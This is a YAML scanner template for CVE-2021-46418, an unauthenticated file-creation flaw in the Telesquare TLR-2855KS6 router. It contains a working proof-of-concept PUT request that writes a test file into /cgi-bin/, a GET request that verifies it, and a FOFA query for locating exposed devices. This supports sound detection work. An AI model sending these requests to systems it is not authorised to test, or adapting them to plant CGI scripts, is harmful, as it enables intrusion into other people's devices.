expression: r0() && r1()
id: CVE-2021-46418
info:
  author: Momen Eldawakhly (Cyber Guy)
  description: "Telesquare TLR-2855KS6 \u4E2D\u5B58\u5728\u901A\u8FC7 PUT \u65B9\u6CD5\
    \u521B\u5EFA\u672A\u6388\u6743\u6587\u4EF6\u7684\u6F0F\u6D1E\uFF0C\u53EF\u5141\
    \u8BB8\u521B\u5EFA CGI \u811A\u672C\u3002\nfofa-query: product==\"TELESQUARE-TLR-2855KS6\"\
    \n"
  name: "Telesquare TLR-2855KS6 - \u4EFB\u610F\u6587\u4EF6\u521B\u5EFA"
  reference:
  - https://www.exploit-db.com/exploits/50862
  - http://packetstormsecurity.com/files/166674/Telesquare-TLR-2855KS6-Arbitrary-File-Creation.html
  - https://drive.google.com/drive/folders/1avIfk1MZNmNQYePE1_n4irC24daxCeBA
  severity: critical
rules:
  r0:
    expression: response.status == 201
    request:
      body: 'File creation via PUT method POC

        '
      headers:
        DNT: 1
      method: PUT
      path: /cgi-bin/testing_cve.txt
  r1:
    expression: response.status == 200 && response.body.bcontains(b'File creation
      via PUT method POC')
    request:
      method: GET
      path: /cgi-bin/testing_cve.txt
